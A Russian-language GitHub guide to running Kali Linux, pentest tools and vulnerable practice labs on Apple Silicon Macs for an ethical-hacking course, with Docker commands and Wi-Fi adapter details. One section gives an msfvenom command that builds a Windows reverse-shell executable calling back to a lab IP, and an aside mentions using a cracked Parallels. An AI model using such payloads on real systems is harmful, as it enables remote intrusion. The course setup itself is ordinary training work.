# Описание
В данной инструкции тезисно описано как запустить виртуалки (Kali Linux), софт и тестовые лабы в Macos среде с процессором Apple Silicon, M серии и ARM64 архитектурой для выполнения заданий из курса "Белый хакер" школы SkillFactory. Так случилось, что я был одним из первых, кто столкнулся с данной проблемой, поэтому и было решено написать эту доку и поддерживать ее по возможности.

Описанное включает все блоки и модули. Ребята с потока говорят, что есть не все. Я уделял внимание только на те инструменты и сервисы, которые необходимы для прохождения практических заданий. 

Исходные данные (M1 Pro):
```
$ uname -a
Darwin mac.local 22.3.0 Darwin Kernel Version 22.3.0: Mon Jan 30 20:38:37 PST 2023; root:xnu-8792.81.3~2/RELEASE_ARM64_T6000 arm64 arm Darwin
```

## На всякий случай

∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨∨ \
**Если есть возможность использовать x64 - ИСПОЛЬЗУЙ!** \
∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧∧

Ставить Windows Server, Windows Desktop и потом это настравить через GUI - крайне трудозатратное дело по времени и нервам, о чем в конце документа. Все остальное можно запустить. Помимо этого бывали случаи когда студент плохо понимает происходящее, а тут еще и на АРМе, жуть вообще. 

### ВАЖНО

Модуль 42 на данный момент **невозможно** сделать на ARM архитектуре. [Подробнее ниже в доке](https://github.com/maxmureev/Apple-Silicon-White-Hacker/tree/main#%D0%BC%D0%BE%D0%B4%D1%83%D0%BB%D1%8C-42-%D1%81%D0%B5%D1%80%D1%82%D0%B8%D1%84%D0%B8%D0%BA%D0%B0%D1%86%D0%B8%D1%8F-oscp). 

# Базовое
## Гипервизор

[UTM](https://mac.getutm.app/). Бесплатен. Под капотом QEMU. Умеет как нативный режим под ARM, так и режим эмуляции для x64. Пока это единственный способ запустить Windows Server и лабу Escalate My Privilege из шестого блока.

[VirtualBox](https://www.virtualbox.org/wiki/Downloads) пока в бете. Бесплатен. Кали на него не встает. Под ним работают **только ARM** дистрибутивы. Последняя протестированная мной версия 7.0.13_BETA4 r160458 (декабрь 2023).

[Parallels](https://www.parallels.com/products/desktop/). Платный. Можно найти кряк, в интернете есть. Под ним работают **только ARM** дистрибутивы. В целом хорош.

[VMware Fusion Player](https://customerconnect.vmware.com/evalcenter?p=fusion-player-personal-13). Бесплатен для не коммерческого использования. Сложная регистрация, ручное рассмотрение заявки на скачивание. Не осилил. Кажется перспективным из-за функционала и бесплатности. Под ним работают **только ARM** дистрибутивы.

Не знаешь что выбрать - **используй UTM**.

Столкнулся, что на определенную версию Кали не обновляется и при ребуте уходит в kernel panic. Поэтому, после базовой установки и настройки сделай ее снапшот или клон (зависит от выбранного гипервизора), чтобы внезапно не переставлять по-новой.

### Kali Linux виртуалка

#### Установка

Качается [ISO](https://www.kali.org/get-kali/#kali-installer-images) под Apple Silicon (ARM64) и устанавливается в выбранный гипервизор. Если последняя версия не встает, попробуй предыдущую или лучше сразу `2022.2`, [прямая ссылка на 2022.2](https://old.kali.org/kali-images/kali-2022.2/kali-linux-2022.2-installer-arm64.iso)

<details><summary>Скрины по установке Kali 2022.2 в UTM</summary>
<p>

Этот раздел для тех, у кого установка Kali вызывает затруднения

![image](https://user-images.githubusercontent.com/14827791/233830180-ef012249-ea8c-41c3-bbc4-5c8810685735.png)

![image](https://user-images.githubusercontent.com/14827791/233830192-f8a22b26-9369-4ee8-8ae9-fd5365ed96a2.png)

![image](https://user-images.githubusercontent.com/14827791/233830264-4588e04a-e6c2-493a-a8ce-7322b154a937.png)

![image](https://user-images.githubusercontent.com/14827791/233830306-b63f9481-742b-494b-be6f-693fed8009ab.png)

![image](https://user-images.githubusercontent.com/14827791/233830384-27fa903a-d8d5-4c22-9365-551174c75863.png)

![image](https://user-images.githubusercontent.com/14827791/233830399-bfe5b2a3-7c04-4c57-b654-4d385b012dfe.png)

![image](https://user-images.githubusercontent.com/14827791/233830455-1d0309f1-d2fb-4a9e-baa0-05b828ddb5f9.png)

![image](https://user-images.githubusercontent.com/14827791/233830480-b31d227b-039f-4c5a-8a61-db51821f9e85.png)

![image](https://user-images.githubusercontent.com/14827791/233830501-e1229752-6fdd-40e7-8fb0-0ca0d6a66157.png)

![image](https://user-images.githubusercontent.com/14827791/233830539-10a10df3-30ea-40e2-9c12-2118a577a5ff.png)

![image](https://user-images.githubusercontent.com/14827791/233830571-afd18824-bcef-4b68-aedf-556a28c26f89.png)

![image](https://user-images.githubusercontent.com/14827791/233831084-3ccf1179-e213-453a-82c8-def4589916d6.png)

![image](https://user-images.githubusercontent.com/14827791/233831108-4cd7bb7c-e6b0-4b89-be1b-1aa00a66cdaf.png)

![image](https://user-images.githubusercontent.com/14827791/233831127-40017717-5c1a-4524-b123-08805fceba27.png)

![image](https://user-images.githubusercontent.com/14827791/233831141-b739daa1-3312-482a-af99-2f68d1f3578f.png)

![image](https://user-images.githubusercontent.com/14827791/233831209-c51b5bb3-815f-4818-93f9-23b600ba7774.png)

![image](https://user-images.githubusercontent.com/14827791/233831231-f9ae4fbc-f802-41e3-800f-45f3a7b33727.png)

![image](https://user-images.githubusercontent.com/14827791/233832646-df1924ec-c1e4-4427-b4ce-249ec8b0166e.png)

![image](https://user-images.githubusercontent.com/14827791/233832671-4de8ecba-36e8-46cb-b5c6-b3390d905f6d.png)

![image](https://user-images.githubusercontent.com/14827791/233831393-1b5e2376-0ddc-47c3-b479-1dab29d6eecf.png)

![image](https://user-images.githubusercontent.com/14827791/233831421-0e2a7d3d-7d47-4f5b-aac7-94b2f9619c3e.png)

![image](https://user-images.githubusercontent.com/14827791/233831446-8d8c565b-5a06-4200-afef-110980b92729.png)

![image](https://user-images.githubusercontent.com/14827791/233831473-c68638e9-8c63-430e-a140-063e4dfc9bd2.png)

![image](https://user-images.githubusercontent.com/14827791/233831486-3803974d-20e6-4d66-9ae8-4dea58429e47.png)

![image](https://user-images.githubusercontent.com/14827791/233831499-e03a7471-e77e-400e-ba13-b331db986f51.png)

![image](https://user-images.githubusercontent.com/14827791/233831526-4d50e7f5-ce8b-432e-9402-627d01fcfd1b.png)

![image](https://user-images.githubusercontent.com/14827791/233831549-fe157c8f-d544-44a2-8697-0a2376c78ed8.png)

![image](https://user-images.githubusercontent.com/14827791/233831617-9cb6c775-5c54-4a1c-92e4-fb90a43790eb.png)

![image](https://user-images.githubusercontent.com/14827791/233832131-3c4fa0ce-4acd-4df7-8a80-f5dfd13ea1d1.png)

![image](https://user-images.githubusercontent.com/14827791/233832243-2da4eeaf-0cce-40bf-bfe3-21ea1669bb13.png)

![image](https://user-images.githubusercontent.com/14827791/233832308-313e113a-5203-4b09-aa1b-3adf01d66f24.png)

![image](https://user-images.githubusercontent.com/14827791/233832380-6585f888-f854-4e9e-9d1c-2ba1d36a978e.png)

![image](https://user-images.githubusercontent.com/14827791/233832398-e8a8d876-3f79-4a49-88d0-1ff127dffd65.png)

![image](https://user-images.githubusercontent.com/14827791/233833588-2a2bd065-ef75-44f1-bbbc-8c2d8618aea6.png)

![image](https://user-images.githubusercontent.com/14827791/233833611-d1317215-765c-4b13-a35d-3f95e377121e.png)


</p>
</details> 

Ходят слухи, что можно запустить из официального образа виртуального жесткого диска для Raspberry, но сам этого не проверял. Если ты проверишь и оно будет работать - свяжись со мной, добавим в документ для упрощения жизни последующим студентам.


#### SSH
Если использование GUI (Graphical User Interface) не требуется, а оно не требуется для большиства задач, поставь в Кали SSH и подключайся к ней из терминала. Так удобнее. Для этого в Кали сделать:

```
sudo apt install openssh-server
sudo systemctl enable ssh
sudo systemctl start ssh
```

С мака подключаться так:
```
ssh <user>@<kali_ip_address>
```

Таким образом отпадет необходимость копипастить через окно UTM в Кали через GUI.

<details><summary>Как это выглядит</summary>
<p>

![tty](https://github.com/maxmureev/Apple-Silicon-White-Hacker/assets/14827791/382b581e-3f8d-4e0b-8fd6-5a66ca054c7e)


</p>
</details> 

#### Шаринг буфера обмена для GUI

В Кали надо поставить эти пакеты:

```
sudo apt install qemu-guest-agent spice-vdagent spice-webdavd
```

Выключить виртуалку и настроить гостевую систему
1. Settings > Sharing: **Enable clipboard sharing**
2. Settings > Display >  Emulated display card: **virtio-gpu-pci**

<details><summary>Скрины по настройке буфера обмена</summary>
<p>

![image](https://github.com/maxmureev/Apple-Silicon-White-Hacker/assets/14827791/6041260e-f53e-41e9-8f81-945e86aec65d)
![image](https://github.com/maxmureev/Apple-Silicon-White-Hacker/assets/14827791/349570a3-2e78-4881-8eaa-a00346ffa3be)

</p>
</details> 

Внутри Кали работает такое сочетание:
- Control(^) + Shift(⇧) + c - копировать
- Control(^) + Shift(⇧) + v - вставить

## Docker

Докер нужен для простоты запуска некоторых приложений

Можно пойти двумя путями - ставить или в Мак, или в Кали и соответсвенно запускать оттуда. Выбирайте сами. Инструкции по запуску из командной строки одинаковы. Если указано открывать http://127.0.0.1, то открывать следует оттуда, где установлен Докер.

Не очевидный момент: после остановки контейнера все данные в нем данные теряются

Не знаешь, что такое Docker? Видео [введение в Docker](https://www.youtube.com/watch?v=dNS61T4MmlM) для новичков. Видео [основные команды Docker'а](https://www.youtube.com/watch?v=EXHxkwDm7c0) для понимания происходящего описанного ниже. 

### Что выбрать для Docker'а?
Если вы понимаете, что делаете, то сами знаете. Если же нет - ставьте в Кали.

#### Мак Docker
Поставить Docker, скачав инсталлятор для [Apple silicon](https://docs.docker.com/desktop/install/mac-install/). Для последующего запуска контейнеров из командной строки, проложение Docker Desktop должно быть запущено.

#### Kali Linux Docker
[Инструкция](https://www.kali.org/docs/containers/installing-docker-on-kali/) по установке

### В целом Docker
Где в параметрах запуска в качестве образа указано `mureevms/*`, там нет официальных образов под ARM, поэтому пришлось собрать самому и выложить в общий доступ на Docker Hub. Где указано что-то другое - используются официальные сборки от разработчиков.

Чтобы не использовать повышение привилегий в системе для запуска контейнеров == не использовать sudo, надо добавить текущего пользователя в группу docker и перезагрузить ОС.

# Остальное
## Софт
### BurpSuite

[Скачать](https://portswigger.net/burp/communitydownload) и поставить куда требуется. Нужна регистрация. Мой личный совет - ставить в Мак. Это ГУИ приложение и использовать его из виртуалки будет больно и особо бессмысленно.

### NoSQLMap
Не удалось запустить под ARM. Из коробки в Кали не предоставлен. В Кали не встает. В Мак тоже не встает. В докере на x64 запускается, но нельзя пользоваться в интерактивном режиме. В принципе, можно обойтись и без него. Требовался только для CTF.

### edb-debugger
Нельзя поставить на АРМ. Запрос на Гитхабе [висит](https://github.com/eteran/edb-debugger/issues/560) уже 6 лет. По сути edb-debugger и не нужен, достаточно посмотреть скринкаст.

### Ghidra
Установка в Kali
```
sudo apt install ghidra
```
Запуск
```
ghidra
```

### sublist3r
Скорее всего у тебя тоже не печатается вывод доменов при запуске команды, например `sublist3r -v -d skillfactory.ru`, надо клонировать исходники, поставить зависимости и поправить одну строку:

```
git clone https://github.com/aboul3la/Sublist3r.git ~/Sublist3r
cd ~/Sublist3r
pip3 install -r requirements.txt
sudo apt-get install python3-requests python3-dnspython python-argparse
nano sublist3r.py
```

Заменить строку 
```
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
```
на
```
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0',
```


Запускать так:

```
cd ~/Sublist3r
python sublist3r.py -v -d skillfactory.ru
```

## Лабы
### WebGoat
Запускается в докере, выполнить команду из консоли:
```
docker run --rm -d --name webgoat -p 80:8888 -p 8080:8080 -p 9090:9090 webgoat/goatandwolf:v8.2.2
```
И в браузере перейти по http://127.0.0.1:8080/WebGoat/login

### DVWA
Запускается в докере, выполнить команду из консоли:
```
docker run --rm -d --name dvwa -p 80:80 mureevms/dvwa:latest
```
В браузере перейти по http://localhost/setup.php и кликнуть по кнопке Create/Reset Database.
После этого можно логиниться http://localhost/login.php c кредами:

Логин: `admin`
Пароль: `password`

### XVWA
Запускается в докере, выполнить команду из консоли:
```
docker run --rm -d --name xvwa -p 80:80 mureevms/xvwa:latest
```
В браузере перейти по http://127.0.0.1/xvwa/setup/ и кликнуть по кнопке Submit/Reset.
После этого можно логиниться, креды находятся в конце странички http://127.0.0.1/xvwa/instruction.php

### OWASP Mutillidae II
Если Кали, поставить зависимость, если мак, то уже поставилось с Докером
```
sudo apt install docker-compose
```
Запуск
```
# Скачать файл конфигурации
wget https://raw.githubusercontent.com/maxmureev/mutillidae-docker/master/docker-compose.yml -O ~/docker-compose.yml
# Запустить
docker-compose -f ~/docker-compose.yml up -d
```
В браузере перейти по http://localhost/set-up-database.php для заполнения БД.
Затем в http://localhost

Остановка
```
docker-compose -f ~/docker-compose.yml down
```
Чуть больше инфы [тут](https://github.com/maxmureev/mutillidae-docker)

### Escalate My Privileges
Требуется для Блока 6. Операционные системы. Итоговая практика по ОС Linux

Предоставляется через OVA шаблон, который надо запустить в VirtualBox, но конечно не работает из-за x64 архитектуры. Пришлось конвертнуть под QEMU, который можно запустить в UTM в режиме совместимости. Для упрощения сделал шаблон и залил в облако. 
Для запуска скачать архив [escalate_my_privilege.utm.zip](https://disk.yandex.ru/d/LPciEeB5aFMAjg) и разархивировать. Внутри каталог escalate_my_privilege.utm (наподобии с *.app каталогами), который при попытке открытия будет импортировать виртуальную машину в UTM, если он установлен.

### GNS3
В Kali не ставится, поскольку описанная в документации установка подходит только для x64. Можно скачать дистрибутив под Mac, но при попытке это сделать написано, что заявка рассматривается в течении двух дней. В пришедшем письме они отказывают в скачивании, ссылаясь на правила экспортного контроля.  Есть вероятность, что при включенном ВПН скачается. Хорошо, что есть другой способ. 

Скачать архир [GNS3](https://github.com/GNS3/gns3-gui/releases). Нужный файл `GNS3.VM.ARM64.x.x.xx.zip`, где x.x.xx версия последнего релиза. [Прямая ссылка](https://github.com/GNS3/gns3-gui/releases/download/v2.2.38/GNS3.VM.ARM64.2.2.38.zip) на последнюю версию в момент написания. Разархивировать его, внутри два файла виртуальных дисков, которые надо подсунуть в виртуалку, созданную в режиме виртуализации. Ниже в спойлере скрины по настройке.

<details><summary>Установка виртуальной машины GNS3 в UTM</summary>
<p>

![image](https://user-images.githubusercontent.com/14827791/235587716-da101b99-2db0-4424-b5b1-44c65312daea.png)

![image](https://user-images.githubusercontent.com/14827791/235587814-b934fcb0-b3fa-48e7-ba50-23f4bafe3858.png)

![image](https://user-images.githubusercontent.com/14827791/235587899-455c2996-dd19-4e02-a2a7-1bd172cce24e.png)

![image](https://user-images.githubusercontent.com/14827791/235587973-0418f34e-50f1-45c1-aef5-f3c9be243b6e.png)

![image](https://user-images.githubusercontent.com/14827791/235588028-e9d501c2-b800-4f59-83e9-d47ddd3c801f.png)

![image](https://user-images.githubusercontent.com/14827791/235588083-28688349-0ad7-4fb9-a20b-054bc4d89d85.png)

![image](https://user-images.githubusercontent.com/14827791/235588125-7d0050b7-7335-4134-8296-9433e058c971.png)

![image](https://user-images.githubusercontent.com/14827791/235588186-81c22f5d-31ea-444e-bd8c-95ea4bb3d4fe.png)

![image](https://user-images.githubusercontent.com/14827791/235588389-40d47684-00db-415d-a523-fb04394c6548.png)

![image](https://user-images.githubusercontent.com/14827791/235588650-e15502cd-3b03-4292-8f7b-b1edaff90b1c.png)

![image](https://user-images.githubusercontent.com/14827791/235588780-cb3df685-049c-4292-b2c9-4876f914c010.png)

![image](https://user-images.githubusercontent.com/14827791/235588650-e15502cd-3b03-4292-8f7b-b1edaff90b1c.png)

![image](https://user-images.githubusercontent.com/14827791/235588907-56e5f98a-6af9-4064-9c89-6b052fd7ba51.png)

![image](https://user-images.githubusercontent.com/14827791/235589045-e7f3f425-a547-4c74-a39a-b10c5c57ee86.png)

![image](https://user-images.githubusercontent.com/14827791/235589126-9985edd6-1fc2-47cb-9601-1575ceb6f530.png)

![image](https://user-images.githubusercontent.com/14827791/235589210-521eeeb1-6b69-485b-bc2a-47275b3442ae.png)

![image](https://user-images.githubusercontent.com/14827791/235589321-1f3e8b1e-77dd-4c02-80db-fd00256e7610.png)

</p>
</details> 

После установки и запуска появится окно с IPадресом машины и варианты подключения к ней.

### PowerShell Empire

Ставить как написано в модуле не надо - не поставится, нет пакетов для arm64. 
Последовательность такая:

0. Предварительно **обязательно** сделать копию/снапшот виртуалки, если что-то пойдет не так

1. Обновить систему
    ```
    sudo apt upgrade
    sudo apt dist-upgrade
    ```

    Если в ходе обновления возникает ошибка, где `X.X.X-kaliX` - версия ядра для которого не конфигурятся хэдеры:
    ```
    dpkg: error processing package linux-image-X.X.X-kaliX-arm64 (--configure):
     installed linux-image-X.X.X-kaliX-arm64 package post-installation script subprocess returned error exit status 1
    dpkg: dependency problems prevent configuration of linux-headers-arm64:
     linux-headers-arm64 depends on linux-headers-X.X.X-kaliX-arm64 (= 6.1.20-2kali1); however:
      Package linux-headers-X.X.X-kaliX-arm64 is not configured yet.
    ```

    То удалить эти хэдеры и ядро:
    ```
    sudo apt remove linux-headers-X.X.X-kaliX-common
    ```
    В моем случае это был `linux-headers-6.1.0-kali7-common`

    Если прошло нормально - повторить обновление и если прошло нормально, ребутнуть виртуалку

2. Поставить зависимости

    Dotnet SDK:
    ```
    curl -SL -o dotnet-sdk-6.0.408-linux-arm64.tar.gz https://download.visualstudio.microsoft.com/download/pr/9c4bff1b-9f35-44a3-95a3-d17224810b08/0f7426d4ce82cd5b55ed1b6f07877d5e/dotnet-sdk-6.0.408-linux-arm64.tar.gz    
    sudo mkdir -p /usr/share/dotnet
    sudo tar -zxf dotnet-sdk-6.0.408-linux-arm64.tar.gz -C /usr/share/dotnet
    sudo ln -s /usr/share/dotnet/dotnet /usr/bin/dotnet
    ```

    PowerShell:
    ```
    curl -L -o /tmp/powershell.tar.gz https://github.com/PowerShell/PowerShell/releases/download/v7.3.4/powershell-7.3.4-linux-arm64.tar.gz
    sudo mkdir -p /opt/microsoft/powershell/7
    sudo tar zxf /tmp/powershell.tar.gz -C /opt/microsoft/powershell/7
    sudo chmod +x /opt/microsoft/powershell/7/pwsh
    sudo ln -s /opt/microsoft/powershell/7/pwsh /usr/bin/pwsh
    ```

3. Поставить PowerShell Empire

    ```
    sudo apt install powershell-empire
    ```

    Запуск сервера:
    ```
    sudo powershell-empire server
    ```

Логин и пароль для входа в веб интерфейсе:  
username: empireadmin  
password: password123

## Модуль 31. Практическая работа 31.6

Если при попытке сгенерировать файл реверс шелла возникает такая ошибка:

```
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.104.91 LPORT=53 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

Это происходит, из-за отсутствия arm исходников и для работы надо дополнительно указать нужную x64 архитектуру:

```
msfvenom -p windows/x64/shell_reverse_tcp --platform win -a x64 LHOST=10.9.104.91 LPORT=53 -f exe -o reverse.exe
```

## Взлом Wi-Fi. 34 модуль

Купил карту [ALFA Network AWUS036ACM](https://market.yandex.ru/product--alfa-network-awus036acm/1881542156?sku=102062826659&cpa=1) с чипсетом MT7612U. Брал за 7100. На момент написания в ямаркете ее нет (пишу это в конце октября, покупал в конце августа), но в других местах есть. 
Повезло, карта заводится на АРМе и Кали ее видит без дополнительной установки драйверов. Без проблем пробрасывается и в UTM, и в Parallels. 

Косяки:
- Не работает индикатор при подключению к Маку, но работает при подключении к Винде. Если хочется включить, описано [тут](https://github.com/morrownr/7612u#known-issues), Known Issue 1
- Драйвер не поддерживает работу на 5ГГц, только 2,4. "Known Issue 4" по ссылке выше. Сама карта умеет 5ГГц, может когда-то исправят

Данные карты:

```
$ lsusb | grep Wireless
Bus 003 Device 002: ID 0e8d:7612 MediaTek Inc. MT7612U 802.11a/b/g/n/ac Wireless Adapter

$ iw dev
phy#0
	Interface wlan0
		ifindex 4
		wdev 0x1
		addr ae:1c:7f:c8:d7:0c
		type managed
		txpower 20.00 dBm
```



<details><summary>Подробные данные карты</summary>
<p>

```
iw list
Wiphy phy0
	wiphy index: 0
	max # scan SSIDs: 4
	max scan IEs length: 2243 bytes
	max # sched scan SSIDs: 0
	max # match sets: 0
	Retry short limit: 7
	Retry long limit: 4
	Coverage class: 0 (up to 0m)
	Device supports RSN-IBSS.
	Device supports AP-side u-APSD.
	Device supports T-DLS.
	Supported Ciphers:
		* WEP40 (00-0f-ac:1)
		* WEP104 (00-0f-ac:5)
		* TKIP (00-0f-ac:2)
		* CCMP-128 (00-0f-ac:4)
		* CCMP-256 (00-0f-ac:10)
		* GCMP-128 (00-0f-ac:8)
		* GCMP-256 (00-0f-ac:9)
		* CMAC (00-0f-ac:6)
		* CMAC-256 (00-0f-ac:13)
		* GMAC-128 (00-0f-ac:11)
		* GMAC-256 (00-0f-ac:12)
	Available Antennas: TX 0x3 RX 0x3
	Configured Antennas: TX 0x3 RX 0x3
	Supported interface modes:
		 * IBSS
		 * managed
		 * AP
		 * AP/VLAN
		 * monitor
		 * mesh point
		 * P2P-client
		 * P2P-GO
	Band 1:
		Capabilities: 0x1ff
			RX LDPC
			HT20/HT40
			SM Power Save disabled
			RX Greenfield
			RX HT20 SGI
			RX HT40 SGI
			TX STBC
			RX STBC 1-stream
			Max AMSDU length: 3839 bytes
			No DSSS/CCK HT40
		Maximum RX AMPDU length 65535 bytes (exponent: 0x003)
		Minimum RX AMPDU time spacing: No restriction (0x00)
		HT TX/RX MCS rate indexes supported: 0-15
		Bitrates (non-HT):
			* 1.0 Mbps (short preamble supported)
			* 2.0 Mbps (short preamble supported)
			* 5.5 Mbps (short preamble supported)
			* 11.0 Mbps (short preamble supported)
			* 6.0 Mbps
			* 9.0 Mbps
			* 12.0 Mbps
			* 18.0 Mbps
			* 24.0 Mbps
			* 36.0 Mbps
			* 48.0 Mbps
			* 54.0 Mbps
		Frequencies:
			* 2412 MHz [1] (20.0 dBm)
			* 2417 MHz [2] (20.0 dBm)
			* 2422 MHz [3] (20.0 dBm)
			* 2427 MHz [4] (20.0 dBm)
			* 2432 MHz [5] (20.0 dBm)
			* 2437 MHz [6] (20.0 dBm)
			* 2442 MHz [7] (20.0 dBm)
			* 2447 MHz [8] (20.0 dBm)
			* 2452 MHz [9] (20.0 dBm)
			* 2457 MHz [10] (20.0 dBm)
			* 2462 MHz [11] (20.0 dBm)
			* 2467 MHz [12] (20.0 dBm)
			* 2472 MHz [13] (20.0 dBm)
			* 2484 MHz [14] (20.0 dBm) (no IR)
	Band 2:
		Capabilities: 0x1ff
			RX LDPC
			HT20/HT40
			SM Power Save disabled
			RX Greenfield
			RX HT20 SGI
			RX HT40 SGI
			TX STBC
			RX STBC 1-stream
			Max AMSDU length: 3839 bytes
			No DSSS/CCK HT40
		Maximum RX AMPDU length 65535 bytes (exponent: 0x003)
		Minimum RX AMPDU time spacing: No restriction (0x00)
		HT TX/RX MCS rate indexes supported: 0-15
		VHT Capabilities (0x318001b0):
			Max MPDU length: 3895
			Supported Channel Width: neither 160 nor 80+80
			RX LDPC
			short GI (80 MHz)
			TX STBC
			RX antenna pattern consistency
			TX antenna pattern consistency
		VHT RX MCS set:
			1 streams: MCS 0-9
			2 streams: MCS 0-9
			3 streams: not supported
			4 streams: not supported
			5 streams: not supported
			6 streams: not supported
			7 streams: not supported
			8 streams: not supported
		VHT RX highest supported: 0 Mbps
		VHT TX MCS set:
			1 streams: MCS 0-9
			2 streams: MCS 0-9
			3 streams: not supported
			4 streams: not supported
			5 streams: not supported
			6 streams: not supported
			7 streams: not supported
			8 streams: not supported
		VHT TX highest supported: 0 Mbps
		Bitrates (non-HT):
			* 6.0 Mbps
			* 9.0 Mbps
			* 12.0 Mbps
			* 18.0 Mbps
			* 24.0 Mbps
			* 36.0 Mbps
			* 48.0 Mbps
			* 54.0 Mbps
		Frequencies:
			* 5180 MHz [36] (20.0 dBm)
			* 5200 MHz [40] (20.0 dBm) (no IR)
			* 5220 MHz [44] (20.0 dBm) (no IR)
			* 5240 MHz [48] (20.0 dBm)
			* 5260 MHz [52] (20.0 dBm) (no IR, radar detection)
			* 5280 MHz [56] (20.0 dBm) (no IR, radar detection)
			* 5300 MHz [60] (20.0 dBm) (no IR, radar detection)
			* 5320 MHz [64] (20.0 dBm) (no IR, radar detection)
			* 5500 MHz [100] (20.0 dBm) (no IR, radar detection)
			* 5520 MHz [104] (20.0 dBm) (no IR, radar detection)
			* 5540 MHz [108] (20.0 dBm) (no IR, radar detection)
			* 5560 MHz [112] (20.0 dBm) (no IR, radar detection)
			* 5580 MHz [116] (20.0 dBm) (no IR, radar detection)
			* 5600 MHz [120] (20.0 dBm) (no IR, radar detection)
			* 5620 MHz [124] (20.0 dBm) (no IR, radar detection)
			* 5640 MHz [128] (20.0 dBm) (no IR, radar detection)
			* 5660 MHz [132] (20.0 dBm) (no IR, radar detection)
			* 5680 MHz [136] (20.0 dBm) (no IR, radar detection)
			* 5700 MHz [140] (20.0 dBm) (no IR, radar detection)
			* 5720 MHz [144] (20.0 dBm) (no IR, radar detection)
			* 5745 MHz [149] (20.0 dBm)
			* 5765 MHz [153] (20.0 dBm) (no IR)
			* 5785 MHz [157] (20.0 dBm) (no IR)
			* 5805 MHz [161] (20.0 dBm) (no IR)
			* 5825 MHz [165] (20.0 dBm) (no IR)
			* 5845 MHz [169] (disabled)
			* 5865 MHz [173] (disabled)
	Supported commands:
		 * new_interface
		 * set_interface
		 * new_key
		 * start_ap
		 * new_station
		 * new_mpath
		 * set_mesh_config
		 * set_bss
		 * authenticate
		 * associate
		 * deauthenticate
		 * disassociate
		 * join_ibss
		 * join_mesh
		 * remain_on_channel
		 * set_tx_bitrate_mask
		 * frame
		 * frame_wait_cancel
		 * set_wiphy_netns
		 * set_channel
		 * tdls_mgmt
		 * tdls_oper
		 * probe_client
		 * set_noack_map
		 * register_beacons
		 * start_p2p_device
		 * set_mcast_rate
		 * connect
		 * disconnect
		 * channel_switch
		 * set_qos_map
		 * set_multicast_to_unicast
	software interface modes (can always be added):
		 * AP/VLAN
		 * monitor
	valid interface combinations:
		 * #{ IBSS } <= 1, #{ managed, AP, mesh point, P2P-client, P2P-GO } <= 2,
		   total <= 2, #channels <= 1, STA/AP BI must match
	HT Capability overrides:
		 * MCS: ff ff ff ff ff ff ff ff ff ff
		 * maximum A-MSDU length
		 * supported channel width
		 * short GI for 40 MHz
		 * max A-MPDU length exponent
		 * min MPDU start spacing
	Device supports TX status socket option.
	Device supports HT-IBSS.
	Device supports SAE with AUTHENTICATE command
	Device supports low priority scan.
	Device supports scan flush.
	Device supports AP scan.
	Device supports per-vif TX power setting
	Driver supports full state transitions for AP/GO clients
	Driver supports a userspace MPM
	Device supports active monitor (which will ACK incoming frames)
	Device supports configuring vdev MAC-addr on create.
	max # scan plans: 1
	max scan plan interval: -1
	max scan plan iterations: 0
	Supported TX frame types:
		 * IBSS: 0x00 0x10 0x20 0x30 0x40 0x50 0x60 0x70 0x80 0x90 0xa0 0xb0 0xc0 0xd0 0xe0 0xf0
		 * managed: 0x00 0x10 0x20 0x30 0x40 0x50 0x60 0x70 0x80 0x90 0xa0 0xb0 0xc0 0xd0 0xe0 0xf0
		 * AP: 0x00 0x10 0x20 0x30 0x40 0x50 0x60 0x70 0x80 0x90 0xa0 0xb0 0xc0 0xd0 0xe0 0xf0
		 * AP/VLAN: 0x00 0x10 0x20 0x30 0x40 0x50 0x60 0x70 0x80 0x90 0xa0 0xb0 0xc0 0xd0 0xe0 0xf0
		 * mesh point: 0x00 0x10 0x20 0x30 0x40 0x50 0x60 0x70 0x80 0x90 0xa0 0xb0 0xc0 0xd0 0xe0 0xf0
		 * P2P-client: 0x00 0x10 0x20 0x30 0x40 0x50 0x60 0x70 0x80 0x90 0xa0 0xb0 0xc0 0xd0 0xe0 0xf0
		 * P2P-GO: 0x00 0x10 0x20 0x30 0x40 0x50 0x60 0x70 0x80 0x90 0xa0 0xb0 0xc0 0xd0 0xe0 0xf0
		 * P2P-device: 0x00 0x10 0x20 0x30 0x40 0x50 0x60 0x70 0x80 0x90 0xa0 0xb0 0xc0 0xd0 0xe0 0xf0
	Supported RX frame types:
		 * IBSS: 0x40 0xb0 0xc0 0xd0
		 * managed: 0x40 0xb0 0xd0
		 * AP: 0x00 0x20 0x40 0xa0 0xb0 0xc0 0xd0
		 * AP/VLAN: 0x00 0x20 0x40 0xa0 0xb0 0xc0 0xd0
		 * mesh point: 0xb0 0xc0 0xd0
		 * P2P-client: 0x40 0xd0
		 * P2P-GO: 0x00 0x20 0x40 0xa0 0xb0 0xc0 0xd0
		 * P2P-device: 0x40 0xd0
	Supported extended features:
		* [ VHT_IBSS ]: VHT-IBSS
		* [ RRM ]: RRM
		* [ FILS_STA ]: STA FILS (Fast Initial Link Setup)
		* [ CQM_RSSI_LIST ]: multiple CQM_RSSI_THOLD records
		* [ CONTROL_PORT_OVER_NL80211 ]: control port over nl80211
		* [ TXQS ]: FQ-CoDel-enabled intermediate TXQs
		* [ AIRTIME_FAIRNESS ]: airtime fairness scheduling
		* [ AQL ]: Airtime Queue Limits (AQL)
		* [ SCAN_RANDOM_SN ]: use random sequence numbers in scans
		* [ SCAN_MIN_PREQ_CONTENT ]: use probe request with only rate IEs in scans
		* [ CONTROL_PORT_NO_PREAUTH ]: disable pre-auth over nl80211 control port support
		* [ DEL_IBSS_STA ]: deletion of IBSS station support
		* [ SCAN_FREQ_KHZ ]: scan on kHz frequency support
		* [ CONTROL_PORT_OVER_NL80211_TX_STATUS ]: tx status for nl80211 control port support
```

</p>
</details> 

